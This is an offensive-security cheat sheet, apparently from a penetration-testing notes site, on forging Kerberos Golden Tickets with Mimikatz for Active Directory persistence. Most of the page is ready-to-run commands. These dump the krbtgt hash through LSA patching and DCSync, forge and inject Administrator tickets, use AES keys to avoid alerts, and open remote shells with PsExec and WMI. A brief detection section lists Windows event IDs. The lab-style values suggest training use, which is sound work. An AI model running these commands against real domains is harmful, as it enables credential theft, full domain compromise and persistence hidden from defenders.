---
title: "Golden Tickets"
description: "Persistence methods using Golden Tickets."
lead: "Using Golden Tickets for persistence in Active Directory with Mimikatz."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "domain_persistence"
weight: 10
toc: true
---

## General

- Golden ticket is signed and ecrypted by hash of krbtgt account, making it a valid TGT ticket
- Since user account validation is not done by the DC/KDC until TGT is older than 20 minutes, we can use even deleted/revoked accounts
- krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine
- Password change has no effect on this attack

## Exploitation

### Arguments

| Argument | Description |
| --- | --- |
| kerberos::golden | Module name |
| /domain:domain:dollarcorp.moneycorp.local | Domain FQDN |
| /sid:S-1-5-21-1874506631-3219952063-538504511 | SID of the domain |
| /krbtgt:ff46a9d8bd66c6efd77603da26796f35 | NTLM hash of the krbtgt account. Use /aes128 and /aes256 for using AES |
| /User:Administrator | Username for which the TGT is generated |
| /id:500 /groups:512 | Optional User RID (default 500) and Group default 513 512 520 518 519) |
| /startoffset:0 | Optional when the ticket is available (default 0 right now) in minutes. Use negative for a ticket available from past and a larger number for future. |
| /endin:600 | Optional ticket lifetime (default is 10 years) in minutes. The default AD setting is 10 hours = 600 minutes |
| /renewmax:10080 | Optional ticket lifetime with renewal (default is 10 years) in minutes. The default AD setting is 7 days = 100800 |
| /ptt | Inject ticket in current PowerShell process |
| /ticket | Save ticket to file for later use |

### Commands

```powershell
# Execute mimikatz on DC as DA to get krbtgt hash
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName "dcorp-dc"

# Use DCSync with DA privileges to get krbtgt hash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'

# On any machine
# Inject ticket into current PowerShell session
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /User:Administrator /id:500 /groups:512 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

# Save ticket to file for later use
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /User:Administrator /id:500 /groups:512 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /startoffset:0 /endin:600 /renewmax:10080 /ticket:krbtgt.kirbi"'

# Get domain policy for tickets to set appropriate values
(Get-DomainPolicy -Domain lab.local)."Kerberos Policy"

# Use AES keys to avoid downgrading encryption and generating abnormal traffic/alerts
Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /User:Administrator /id:500 /groups:512 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /aes128:AES128KEY /aes256:AES256KEY /startoffset:0 /endin:600 /renewmax:10080 /ticket:krbtgt.kirbi"'

# Inject ticket into current session
Invoke-Mimikatz -Command '"kerberos::ptt krbtgt.kirbi"'
```

### Executing Commands / Getting a Shell

```powershell
# Inject ticket and open command prompt in current context
Invoke-Mimikatz -Command '"kerberos::ptt krbtgt.kirbi" "misc::cmd"'

# Open command prompt on other machine
PsExec.exe -AcceptEULA \\dcorp-dc cmd.exe

# Run command using WMI
gwmi -Class win32_computersystem -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```

## Detection

- Event IDs:
  - 4624: Account Logon
  - 4634: Account Logoff
  - 4672: Admin Logon

```powershell
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List -Property *
```
